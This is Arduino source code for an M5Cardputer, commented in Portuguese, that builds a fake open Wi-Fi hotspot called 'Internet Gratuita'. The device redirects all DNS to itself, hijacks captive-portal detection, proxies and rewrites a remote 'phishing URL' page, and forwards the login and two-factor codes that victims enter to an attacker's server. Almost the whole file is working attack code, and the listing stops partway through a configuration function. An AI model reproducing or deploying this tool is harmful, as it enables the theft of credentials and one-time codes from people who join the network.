#include <M5Cardputer.h>
#include <HTTPClient.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <WiFiClientSecure.h>

// Display definitions for Cardputer
#define DISP M5Cardputer.Display
#define BGCOLOR BLACK
#define FGCOLOR WHITE
#define MEDIUM_TEXT 2
#define TINY_TEXT 1
#define SMALL_TEXT 1

// Configurações do captive portal
String portalTitle = "Internet Gratuita";
String portalSSID = "Internet Gratuita";
String portalURL = "PLACE_ECHOPHISH_URL_HERE.COM.BR";
String portalHost = portalURL;

// Configurações de internet
String internetSSID = "WIFI_SSID_FOR_INTERNET_CONNECTION";
String internetPassword = "WIFI_PASSWORD_FOR_INTERNET_CONNECTION";
bool internetConnected = false;

int totalHits = 0;

// Configurações do sistema
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress AP_IP(192, 168, 4, 1);
IPAddress AP_SUBNET(255, 255, 255, 0);
DNSServer dnsServer;
WebServer webServer(80);

// Variáveis para debug
String lastRequest = "";

// Função para mostrar status
void showStatus(String message) {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  
  DISP.println("=== STATUS ===");
  DISP.println(message);
  DISP.println("==============");
  DISP.printf("Acessos: %d\n", totalHits);
  DISP.printf("Internet: %s\n", internetConnected ? "CONECTADO" : "OFFLINE");
  DISP.printf("Ultima: %s\n", lastRequest.substring(0, 20).c_str());
}

// Conectar à internet
bool connectToInternet() {
  showStatus("CONECTANDO INTERNET\n" + internetSSID);
  
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
  WiFi.begin(internetSSID.c_str(), internetPassword.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 30) {
    delay(1000);
    attempts++;
  }
  
  internetConnected = (WiFi.status() == WL_CONNECTED);
  
  if (internetConnected) {
    showStatus("INTERNET CONECTADA!");
  } else {
    showStatus("FALHA NA INTERNET!");
  }
  
  delay(2000);
  return internetConnected;
}

// Função para obter content type baseado na extensão
String getContentType(String filename) {
  if (filename.endsWith(".htm") || filename.endsWith(".html")) return "text/html";
  else if (filename.endsWith(".css")) return "text/css";
  else if (filename.endsWith(".js")) return "application/javascript";
  else if (filename.endsWith(".png")) return "image/png";
  else if (filename.endsWith(".jpg") || filename.endsWith(".jpeg")) return "image/jpeg";
  else if (filename.endsWith(".gif")) return "image/gif";
  else if (filename.endsWith(".ico")) return "image/x-icon";
  else if (filename.endsWith(".svg")) return "image/svg+xml";
  else if (filename.endsWith(".woff")) return "font/woff";
  else if (filename.endsWith(".woff2")) return "font/woff2";
  else if (filename.endsWith(".ttf")) return "font/ttf";
  else return "text/plain";
}

// Função para resolver URL relativa para absoluta
String resolveRelativeUrl(String baseUrl, String relativeUrl) {
  if (relativeUrl.startsWith("http")) {
    return relativeUrl; // Já é absoluta
  }
  
  if (relativeUrl.startsWith("//")) {
    return "https:" + relativeUrl; // Protocol-relative URL
  }
  
  // Extrair base path do baseUrl
  int protocolEnd = baseUrl.indexOf("://");
  if (protocolEnd == -1) return relativeUrl;
  
  int domainEnd = baseUrl.indexOf("/", protocolEnd + 3);
  String baseDomain = baseUrl.substring(0, domainEnd);
  String basePath = "/";
  
  if (domainEnd != -1) {
    basePath = baseUrl.substring(domainEnd);
    // Remover o nome do arquivo se houver
    int lastSlash = basePath.lastIndexOf("/");
    if (lastSlash != -1) {
      basePath = basePath.substring(0, lastSlash + 1);
    }
  }
  
  // Resolver a URL relativa
  if (relativeUrl.startsWith("/")) {
    // URL absoluta no domínio
    return baseDomain + relativeUrl;
  } else if (relativeUrl.startsWith("../")) {
    // Subir diretórios
    String tempPath = basePath;
    String tempRelative = relativeUrl;
    
    while (tempRelative.startsWith("../")) {
      // Subir um nível no basePath
      int lastSlash = tempPath.lastIndexOf("/", tempPath.length() - 2);
      if (lastSlash != -1) {
        tempPath = tempPath.substring(0, lastSlash + 1);
      }
      tempRelative = tempRelative.substring(3);
    }
    return baseDomain + tempPath + tempRelative;
  } else if (relativeUrl.startsWith("./")) {
    // Diretório atual
    return baseDomain + basePath + relativeUrl.substring(2);
  } else {
    // Relativa simples
    return baseDomain + basePath + relativeUrl;
  }
}

// Função para modificar CSS e substituir URLs - MELHORADA
String modifyCSS(String css, String cssUrl) {
  showStatus("MODIFICANDO CSS...");

  int pos = 0;
  while ((pos = css.indexOf("url(", pos)) != -1) {
    int end = css.indexOf(")", pos + 4);
    if (end != -1) {
      String urlContent = css.substring(pos + 4, end);
      
      // Remover aspas se existirem
      urlContent.trim();
      if (urlContent.startsWith("\"") && urlContent.endsWith("\"")) {
        urlContent = urlContent.substring(1, urlContent.length() - 1);
      } else if (urlContent.startsWith("'") && urlContent.endsWith("'")) {
        urlContent = urlContent.substring(1, urlContent.length() - 1);
      }
      
      // Remover espaços em branco extras
      urlContent.trim();
      
      if (urlContent.length() > 0 && !urlContent.startsWith("data:") && !urlContent.startsWith("/proxy?url=")) {
        String resolvedUrl = resolveRelativeUrl(cssUrl, urlContent);
        String newUrl = "url(/proxy?url=" + resolvedUrl + ")";
        css = css.substring(0, pos) + newUrl + css.substring(end + 1);
        pos = pos + newUrl.length();
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  // Também processar @import URLs
  pos = 0;
  while ((pos = css.indexOf("@import", pos)) != -1) {
    int end = css.indexOf(";", pos + 7);
    if (end != -1) {
      String importLine = css.substring(pos + 7, end);
      importLine.trim();
      
      // Verificar se é URL ou string
      if (importLine.startsWith("url(")) {
        int urlStart = importLine.indexOf("(") + 1;
        int urlEnd = importLine.lastIndexOf(")");
        if (urlEnd > urlStart) {
          String urlContent = importLine.substring(urlStart, urlEnd);
          // Remover aspas
          if ((urlContent.startsWith("\"") && urlContent.endsWith("\"")) || 
              (urlContent.startsWith("'") && urlContent.endsWith("'"))) {
            urlContent = urlContent.substring(1, urlContent.length() - 1);
          }
          
          if (urlContent.length() > 0 && !urlContent.startsWith("/proxy?url=")) {
            String resolvedUrl = resolveRelativeUrl(cssUrl, urlContent);
            String newImport = "@import url(/proxy?url=" + resolvedUrl + ");";
            css = css.substring(0, pos) + newImport + css.substring(end + 1);
            pos = pos + newImport.length();
          } else {
            pos = end + 1;
          }
        } else {
          pos = end + 1;
        }
      } else if ((importLine.startsWith("\"") && importLine.endsWith("\"")) || 
                 (importLine.startsWith("'") && importLine.endsWith("'"))) {
        // @import "file.css"
        String urlContent = importLine.substring(1, importLine.length() - 1);
        if (urlContent.length() > 0 && !urlContent.startsWith("/proxy?url=")) {
          String resolvedUrl = resolveRelativeUrl(cssUrl, urlContent);
          String newImport = "@import url(/proxy?url=" + resolvedUrl + ");";
          css = css.substring(0, pos) + newImport + css.substring(end + 1);
          pos = pos + newImport.length();
        } else {
          pos = end + 1;
        }
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  return css;
}

// Função de proxy universal - FORÇA o carregamento de qualquer recurso
void handleProxy() {
  if (!internetConnected) {
    webServer.send(503, "text/plain", "No internet connection");
    return;
  }
  
  String targetUrl = webServer.arg("url");
  if (targetUrl.length() == 0) {
    webServer.send(400, "text/plain", "Missing url parameter");
    return;
  }
  
  lastRequest = targetUrl;
  showStatus("PROXY: " + targetUrl.substring(0, 30));
  
  // Forçar HTTPS se não tiver protocolo
  if (!targetUrl.startsWith("http")) {
    targetUrl = "https://" + targetUrl;
  }
  
  WiFiClientSecure *client = new WiFiClientSecure();
  client->setInsecure();
  client->setTimeout(30000);
  
  HTTPClient https;
  
  if (https.begin(*client, targetUrl)) {
    https.setTimeout(30000);
    https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    
    // Headers básicos
    https.addHeader("User-Agent", "Mozilla/5.0 (Android; Mobile)");
    https.addHeader("Accept", "*/*");
    
    int httpCode = https.GET();
    
    if (httpCode > 0) {
      String contentType = https.header("Content-Type");
      String response = https.getString();
      
      // MODIFICAR CSS SE FOR O CASO
      // if (contentType.indexOf("css") != -1 || targetUrl.endsWith(".css")) {
      //   response = modifyCSS(response, targetUrl);
      //   contentType = "text/css";
      // }
      
      if (contentType.length() == 0) {
        // Determinar content type pela URL
        contentType = getContentType(targetUrl);
      }
      
      webServer.send(200, contentType, response);
      showStatus("PROXY OK: " + String(response.length()) + " bytes");
    } else {
      String errorMsg = https.errorToString(httpCode);
      showStatus("PROXY ERRO: " + errorMsg);
      webServer.send(500, "text/plain", "Proxy error: " + errorMsg);
    }
    
    https.end();
  } else {
    showStatus("PROXY FALHA HTTPS");
    webServer.send(500, "text/plain", "HTTPS failed");
  }
  
  delete client;
}

// Função para processar resposta de formulário e modificar HTML se necessário
String processFormResponse(String response, int httpCode, String contentType) {
  // Se for HTML e código de sucesso, modificar o HTML
  if ((contentType.indexOf("html") != -1 || contentType.length() == 0) && 
      (httpCode == 200 || httpCode == 302)) {
    showStatus("MODIFICANDO RESPOSTA DO FORM...");
    return modifyHTML(response);
  }
  return response;
}

// Handler para processar o formulário de submit
void handleSubmit() {
  if (!internetConnected) {
    webServer.send(503, "text/html", "<html><body><h1>No Internet Connection</h1></body></html>");
    return;
  }
  
  showStatus("PROCESSANDO FORMULARIO SUBMIT...");
  
  String targetUrl = portalURL + "/submit";
  
  WiFiClientSecure *client = new WiFiClientSecure();
  client->setInsecure();
  client->setTimeout(30000);
  
  HTTPClient https;
  
  if (https.begin(*client, targetUrl)) {
    https.setTimeout(30000);
    https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    
    // Copiar headers
    for (int i = 0; i < webServer.headers(); i++) {
      String headerName = webServer.headerName(i);
      String headerValue = webServer.header(i);
      
      if (headerName != "Host") {
        https.addHeader(headerName, headerValue);
      }
    }
    
    // Headers essenciais para POST
    https.addHeader("Host", portalHost);
    https.addHeader("Content-Type", "application/x-www-form-urlencoded");
    https.addHeader("User-Agent", "Mozilla/5.0 (Android; Mobile)");
    
    // Coletar dados do formulário
    String postData = "";
    for (int i = 0; i < webServer.args(); i++) {
      if (i > 0) postData += "&";
      postData += webServer.argName(i) + "=" + webServer.arg(i);
    }
    
    showStatus("ENVIANDO POST SUBMIT: " + postData.substring(0, 30));
    
    int httpCode = https.POST(postData);
    
    if (httpCode > 0) {
      String response = https.getString();
      String contentType = https.header("Content-Type");
      if (contentType.length() == 0) contentType = "text/html";
      
      // Processar resposta - MODIFICAR HTML SE FOR O CASO
      response = processFormResponse(response, httpCode, contentType);
      
      // Se for um redirecionamento, modificar o Location header
      if (httpCode == 302 || httpCode == 301) {
        String location = https.header("Location");
        if (location.length() > 0) {
          // Se o redirecionamento é para uma URL externa, modificar para nossa rota
          if (location.startsWith("http")) {
            location = "/proxy?url=" + location;
          }
          webServer.sendHeader("Location", location);
        }
      }
      
      webServer.send(httpCode, contentType, response);
      showStatus("FORMULARIO SUBMIT ENVIADO! Codigo: " + String(httpCode));
    } else {
      String errorMsg = https.errorToString(httpCode);
      showStatus("ERRO FORMULARIO SUBMIT: " + errorMsg);
      webServer.send(500, "text/html", "<html><body><h1>Form submission error</h1></body></html>");
    }
    
    https.end();
  } else {
    showStatus("FALHA HTTPS FORMULARIO SUBMIT");
    webServer.send(500, "text/html", "<html><body><h1>Connection failed</h1></body></html>");
  }
  
  delete client;
}

// Handler para processar o formulário twoFA
void handleTwoFA() {
  if (!internetConnected) {
    webServer.send(503, "text/html", "<html><body><h1>No Internet Connection</h1></body></html>");
    return;
  }
  
  showStatus("PROCESSANDO FORMULARIO TWOFA...");
  
  String targetUrl = portalURL + "/twoFA";
  
  WiFiClientSecure *client = new WiFiClientSecure();
  client->setInsecure();
  client->setTimeout(30000);
  
  HTTPClient https;
  
  if (https.begin(*client, targetUrl)) {
    https.setTimeout(30000);
    https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    
    // Copiar headers
    for (int i = 0; i < webServer.headers(); i++) {
      String headerName = webServer.headerName(i);
      String headerValue = webServer.header(i);
      
      if (headerName != "Host") {
        https.addHeader(headerName, headerValue);
      }
    }
    
    // Headers essenciais para POST
    https.addHeader("Host", portalHost);
    https.addHeader("Content-Type", "application/x-www-form-urlencoded");
    https.addHeader("User-Agent", "Mozilla/5.0 (Android; Mobile)");
    
    // Coletar dados do formulário
    String postData = "";
    for (int i = 0; i < webServer.args(); i++) {
      if (i > 0) postData += "&";
      postData += webServer.argName(i) + "=" + webServer.arg(i);
    }
    
    showStatus("ENVIANDO POST TWOFA: " + postData.substring(0, 30));
    
    int httpCode = https.POST(postData);
    
    if (httpCode > 0) {
      String response = https.getString();
      String contentType = https.header("Content-Type");
      if (contentType.length() == 0) contentType = "text/html";
      
      // Processar resposta - MODIFICAR HTML SE FOR O CASO
      response = processFormResponse(response, httpCode, contentType);
      
      // Se for um redirecionamento, modificar o Location header
      if (httpCode == 302 || httpCode == 301) {
        String location = https.header("Location");
        if (location.length() > 0) {
          // Se o redirecionamento é para uma URL externa, modificar para nossa rota
          if (location.startsWith("http")) {
            location = "/proxy?url=" + location;
          }
          webServer.sendHeader("Location", location);
        }
      }
      
      webServer.send(httpCode, contentType, response);
      showStatus("FORMULARIO TWOFA ENVIADO! Codigo: " + String(httpCode));
    } else {
      String errorMsg = https.errorToString(httpCode);
      showStatus("ERRO FORMULARIO TWOFA: " + errorMsg);
      webServer.send(500, "text/html", "<html><body><h1>Form submission error</h1></body></html>");
    }
    
    https.end();
  } else {
    showStatus("FALHA HTTPS FORMULARIO TWOFA");
    webServer.send(500, "text/html", "<html><body><h1>Connection failed</h1></body></html>");
  }
  
  delete client;
}

// Função para modificar HTML e substituir TODAS as URLs por proxy (EXCETO FORM ACTIONS ESPECÍFICOS)
String modifyHTML(String html) {
  showStatus("MODIFICANDO HTML...");
  
  // Lista de actions de formulário que NÃO devem ser modificados
  String preservedActions[] = {"/submit", "/twoFA"};
  int preservedCount = 2;
  
  // Substituir URLs em src (ABSOLUTAS E RELATIVAS)
  int pos = 0;
  while ((pos = html.indexOf("src=\"", pos)) != -1) {
    int end = html.indexOf("\"", pos + 5);
    if (end != -1) {
      String originalUrl = html.substring(pos + 5, end);
      if (originalUrl.length() > 0 && !originalUrl.startsWith("data:") && !originalUrl.startsWith("/proxy?url=")) {
        String resolvedUrl = resolveRelativeUrl(portalURL, originalUrl);
        String newUrl = "/proxy?url=" + resolvedUrl;
        html = html.substring(0, pos + 5) + newUrl + html.substring(end);
        pos = end + newUrl.length() - originalUrl.length();
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  // Substituir URLs em href (ABSOLUTAS E RELATIVAS) - EXCETO PARA FORM ACTION
  pos = 0;
  while ((pos = html.indexOf("href=\"", pos)) != -1) {
    int end = html.indexOf("\"", pos + 6);
    if (end != -1) {
      String originalUrl = html.substring(pos + 6, end);
      if (originalUrl.length() > 0 && !originalUrl.startsWith("data:") && !originalUrl.startsWith("#") && !originalUrl.startsWith("/proxy?url=")) {
        String resolvedUrl = resolveRelativeUrl(portalURL, originalUrl);
        String newUrl = "/proxy?url=" + resolvedUrl;
        html = html.substring(0, pos + 6) + newUrl + html.substring(end);
        pos = end + newUrl.length() - originalUrl.length();
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  // NÃO modificar action de formulários específicos - deixar como "/submit" e "/twoFA" para nossos handlers
  pos = 0;
  while ((pos = html.indexOf("action=\"", pos)) != -1) {
    int end = html.indexOf("\"", pos + 8);
    if (end != -1) {
      String originalAction = html.substring(pos + 8, end);
      bool shouldPreserve = false;
      
      // Verificar se é uma action que deve ser preservada
      for (int i = 0; i < preservedCount; i++) {
        if (originalAction == preservedActions[i]) {
          shouldPreserve = true;
          break;
        }
      }
      
      // Se o action não for preservado e for uma URL externa, então modificar
      if (!shouldPreserve && originalAction.length() > 0 && 
          !originalAction.startsWith("/proxy?url=") && !originalAction.startsWith("#")) {
        if (originalAction.startsWith("http")) {
          // URL absoluta
          String newAction = "/proxy?url=" + originalAction;
          html = html.substring(0, pos + 8) + newAction + html.substring(end);
          pos = end + newAction.length() - originalAction.length();
        } else {
          // URL relativa - resolver para absoluta primeiro
          String resolvedUrl = resolveRelativeUrl(portalURL, originalAction);
          String newAction = "/proxy?url=" + resolvedUrl;
          html = html.substring(0, pos + 8) + newAction + html.substring(end);
          pos = end + newAction.length() - originalAction.length();
        }
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  // Substituir URLs em srcset (ABSOLUTAS E RELATIVAS)
  pos = 0;
  while ((pos = html.indexOf("srcset=\"", pos)) != -1) {
    int end = html.indexOf("\"", pos + 8);
    if (end != -1) {
      String srcset = html.substring(pos + 8, end);
      String newSrcset = "";
      
      int commaPos = 0;
      int lastCommaPos = 0;
      while ((commaPos = srcset.indexOf(",", lastCommaPos)) != -1) {
        String part = srcset.substring(lastCommaPos, commaPos);
        // Encontrar URL nesta parte (pode ter descritor de tamanho)
        int spacePos = part.lastIndexOf(" ");
        if (spacePos != -1) {
          String url = part.substring(0, spacePos);
          String descriptor = part.substring(spacePos);
          if (url.length() > 0 && !url.startsWith("data:") && !url.startsWith("/proxy?url=")) {
            String resolvedUrl = resolveRelativeUrl(portalURL, url);
            newSrcset += "/proxy?url=" + resolvedUrl + descriptor + ",";
          } else {
            newSrcset += part + ",";
          }
        } else {
          // Não tem descriptor, a parte toda é a URL
          if (part.length() > 0 && !part.startsWith("data:") && !part.startsWith("/proxy?url=")) {
            String resolvedUrl = resolveRelativeUrl(portalURL, part);
            newSrcset += "/proxy?url=" + resolvedUrl + ",";
          } else {
            newSrcset += part + ",";
          }
        }
        lastCommaPos = commaPos + 1;
      }
      
      // Última parte
      String part = srcset.substring(lastCommaPos);
      int spacePos = part.lastIndexOf(" ");
      if (spacePos != -1) {
        String url = part.substring(0, spacePos);
        String descriptor = part.substring(spacePos);
        if (url.length() > 0 && !url.startsWith("data:") && !url.startsWith("/proxy?url=")) {
          String resolvedUrl = resolveRelativeUrl(portalURL, url);
          newSrcset += "/proxy?url=" + resolvedUrl + descriptor;
        } else {
          newSrcset += part;
        }
      } else {
        if (part.length() > 0 && !part.startsWith("data:") && !part.startsWith("/proxy?url=")) {
          String resolvedUrl = resolveRelativeUrl(portalURL, part);
          newSrcset += "/proxy?url=" + resolvedUrl;
        } else {
          newSrcset += part;
        }
      }
      
      html = html.substring(0, pos + 8) + newSrcset + html.substring(end);
      pos = end + newSrcset.length() - srcset.length();
    } else {
      break;
    }
  }
  
  // Substituir URLs em background-image
  pos = 0;
  while ((pos = html.indexOf("url('", pos)) != -1) {
    int end = html.indexOf("')", pos + 5);
    if (end != -1) {
      String originalUrl = html.substring(pos + 5, end);
      if (originalUrl.length() > 0 && !originalUrl.startsWith("data:") && !originalUrl.startsWith("/proxy?url=")) {
        String resolvedUrl = resolveRelativeUrl(portalURL, originalUrl);
        String newUrl = "/proxy?url=" + resolvedUrl;
        html = html.substring(0, pos + 5) + newUrl + html.substring(end);
        pos = end + newUrl.length() - originalUrl.length();
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  // Substituir URLs em url("...")
  pos = 0;
  while ((pos = html.indexOf("url(\"", pos)) != -1) {
    int end = html.indexOf("\")", pos + 6);
    if (end != -1) {
      String originalUrl = html.substring(pos + 6, end);
      if (originalUrl.length() > 0 && !originalUrl.startsWith("data:") && !originalUrl.startsWith("/proxy?url=")) {
        String resolvedUrl = resolveRelativeUrl(portalURL, originalUrl);
        String newUrl = "/proxy?url=" + resolvedUrl;
        html = html.substring(0, pos + 6) + newUrl + html.substring(end);
        pos = end + newUrl.length() - originalUrl.length();
      } else {
        pos = end + 1;
      }
    } else {
      break;
    }
  }
  
  showStatus("HTML MODIFICADO!");
  return html;
}

// Handler para a página principal - BAIXA E MODIFICA O HTML
void handleRoot() {
  if (!internetConnected) {
    webServer.send(503, "text/html", "<html><body><h1>No Internet</h1></body></html>");
    return;
  }
  
  showStatus("BAIXANDO PORTAL...");
  
  WiFiClientSecure *client = new WiFiClientSecure();
  client->setInsecure();
  client->setTimeout(30000);
  
  HTTPClient https;
  
  if (https.begin(*client, portalURL)) {
    https.setTimeout(30000);
    
    int httpCode = https.GET();
    
    if (httpCode == 200) {
      String html = https.getString();
      html = modifyHTML(html);
      webServer.send(200, "text/html", html);
      showStatus("PORTAL SERVIDO!");
    } else {
      webServer.send(500, "text/html", "<html><body><h1>Error loading portal</h1></body></html>");
    }
    
    https.end();
  } else {
    webServer.send(500, "text/html", "<html><body><h1>Connection failed</h1></body></html>");
  }
  
  delete client;
}

// Handler para captive portal detection
void handleCaptivePortal() {
  showStatus("CAPTIVE DETECTADO\nREDIRECIONANDO...");
  webServer.sendHeader("Location", "http://" + AP_IP.toString() + "/");
  webServer.send(302, "text/plain", "");
}

void setupWiFi() {
  showStatus("INICIANDO AP...");
  
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
  if (!WiFi.softAPConfig(AP_IP, AP_IP, AP_SUBNET)) {
    showStatus("ERRO CONFIG AP");
  }
  
  if (WiFi.softAP(portalSSID.c_str())) {
    showStatus("AP INICIADO:\n" + portalSSID);
  } else {
    showStatus("FALHA NO AP");
  }
  
  delay(2000);
}

void setupWebServer() {
  showStatus("CONFIGURANDO\nSERVERS...");
  
  // DNS Server - MAIS AGRESSIVO
  dnsServer.start(DNS_PORT, "*", AP_IP);
  
  // Handlers para captive portal detection
  webServer.on("/generate_204", HTTP_GET, handleCaptivePortal);
  webServer.on("/hotspot-detect.html", HTTP_GET, handleCaptivePortal);
  webServer.on("/ncsi.txt", HTTP_GET, []() {
    showStatus("WINDOWS DETECTADO");
    webServer.send(200, "text/plain", "Microsoft NCSI");
  });
  webServer.on("/connecttest.txt", HTTP_GET, []() {
    showStatus("WINDOWS DETECTADO");
    webServer.send(200, "text/plain", "success");
  });
  
  // Handlers principais
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.on("/twoFA", HTTP_POST, handleTwoFA);
  webServer.on("/proxy", HTTP_GET, handleProxy);
  
  // Handler para outras requisições
  webServer.onNotFound([]() {
    totalHits++;
    // Para qualquer outra requisição, servir a página principal
    handleRoot();
  });

  webServer.begin();
  showStatus("SISTEMA PRONTO!\nAGUARDANDO...");
}

void printHomeScreen() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" zPortal ATIVO ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("Portal: %s\n", portalTitle.c_str());
  DISP.printf("SSID: %s\n", portalSSID.c_str());
  DISP.print("IP: ");
  DISP.println(AP_IP.toString().c_str());
  DISP.printf("Internet: %s\n", internetConnected ? "CONECTADO" : "OFFLINE");
  DISP.printf("Acessos: %d\n", totalHits);
  DISP.setTextSize(TINY_TEXT);
  DISP.println("\n[R] Reconectar Internet");
  DISP.println("[M] Menu de Configuração");
}

// FUNÇÕES DO MENU DE CONFIGURAÇÃO
void showMenu() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("=== MENU CONFIG ===");
  DISP.println("1 - Nome do Portal");
  DISP.println("2 - SSID do Portal");
  DISP.println("3 - URL Phishing");
  DISP.println("4 - WiFi Cliente SSID");
  DISP.println("5 - WiFi Cliente Senha");
  DISP.println("6 - Reiniciar Sistema");
  DISP.println("7 - Status/Testes");
  DISP.println("8 - Voltar");
  DISP.println("===================");
}

void configPortalTitle() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" NOME DO PORTAL ");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("Nome exibido nas paginas:\nEnter para Confirmar");
  
  uint8_t cursorY = DISP.getCursorY();
  String newTitle = portalTitle;
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s", newTitle.c_str());
  bool confirmed = false;

  while(!confirmed){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del && newTitle.length() > 0) {
        newTitle.remove(newTitle.length() - 1);
      }
      if(status.enter) {
        confirmed = true;
      }
      if(newTitle.length() < 32) {
        for(auto i : status.word) {
          if(i != '\n' && i != '\r') {
            newTitle += i;
          }
        }
      }
      DISP.fillRect(0, cursorY, DISP.width(), DISP.height() - cursorY, BLACK);
      DISP.setCursor(0, cursorY);
      DISP.printf("%s", newTitle.c_str());
    }
  }

  if(newTitle.length() > 0){
    portalTitle = newTitle;
    showStatus("NOME DO PORTAL\nALTERADO!");
    delay(2000);
  }
}

void configPortalSSID() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" SSID DO PORTAL ");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("Nome da rede WiFi:\nEnter para Confirmar");
  
  uint8_t cursorY = DISP.getCursorY();
  String newSSID = portalSSID;
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s", newSSID.c_str());
  bool confirmed = false;

  while(!confirmed){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del && newSSID.length() > 0) {
        newSSID.remove(newSSID.length() - 1);
      }
      if(status.enter) {
        confirmed = true;
      }
      if(newSSID.length() < 32) {
        for(auto i : status.word) {
          if(i != '\n' && i != '\r') {
            newSSID += i;
          }
        }
      }
      DISP.fillRect(0, cursorY, DISP.width(), DISP.height() - cursorY, BLACK);
      DISP.setCursor(0, cursorY);
      DISP.printf("%s", newSSID.c_str());
    }
  }

  if(newSSID.length() > 0){
    portalSSID = newSSID;
    showStatus("SSID PORTAL ALTERADO!\nReiniciando AP...");
    WiFi.softAPdisconnect(true);
    setupWiFi();
    delay(2000);
  }
}

void configPortalURL() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" URL PHISHING ");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("URL do captive portal:\nEnter para Confirmar");
  
  uint8_t cursorY = DISP.getCursorY();
  String newURL = portalURL;
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s", newURL.c_str());
  bool confirmed = false;

  while(!confirmed){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del && newURL.length() > 0) {
        newURL.remove(newURL.length() - 1);
      }
      if(status.enter) {
        confirmed = true;
      }
      if(newURL.length() < 200) {
        for(auto i : status.word) {
          if(i != '\n' && i != '\r') {
            newURL += i;
          }
        }
      }
      DISP.fillRect(0, cursorY, DISP.width(), DISP.height() - cursorY, BLACK);
      DISP.setCursor(0, cursorY);
      DISP.printf("%s", newURL.c_str());
    }
  }

  if(newURL.length() > 0){
    portalURL = newURL;
    
    // Extrair host da URL
    int protocolEnd = portalURL.indexOf("://");
    if (protocolEnd != -1) {
      int hostStart = protocolEnd + 3;
      int hostEnd = portalURL.indexOf("/", hostStart);
      if (hostEnd != -1) {
        portalHost = portalURL.substring(hostStart, hostEnd);
      } else {
        portalHost = portalURL.substring(hostStart);
      }
    }
    
    showStatus("URL PHISHING\nALTERADA!");
    delay(2000);
  }
}

void configWifiSSID() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" WIFI CLIENTE SSID ");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("SSID da rede para internet:\nEnter para Confirmar");
  
  uint8_t cursorY = DISP.getCursorY();
  String newWifiSSID = internetSSID;
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s", newWifiSSID.c_str());
  bool confirmed = false;

  while(!confirmed){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del && newWifiSSID.length() > 0) {
        newWifiSSID.remove(newWifiSSID.length() - 1);
      }
      if(status.enter) {
        confirmed = true;
      }
      if(newWifiSSID.length() < 32) {
        for(auto i : status.word) {
          if(i != '\n' && i != '\r') {
            newWifiSSID += i;
          }
        }
      }
      DISP.fillRect(0, cursorY, DISP.width(), DISP.height() - cursorY, BLACK);
      DISP.setCursor(0, cursorY);
      DISP.printf("%s", newWifiSSID.c_str());
    }
  }

  if(newWifiSSID.length() > 0){
    internetSSID = newWifiSSID;
    showStatus("WIFI CLIENTE SSID\nALTERADO!\nReconectando...");
    connectToInternet();
    delay(2000);
  }
}

void configWifiPassword() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" WIFI CLIENTE SENHA ");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("Senha da rede WiFi:\nEnter para Confirmar");
  
  uint8_t cursorY = DISP.getCursorY();
  String newPassword = internetPassword;
  DISP.setTextSize(SMALL_TEXT);
  
  // Mostrar asteriscos
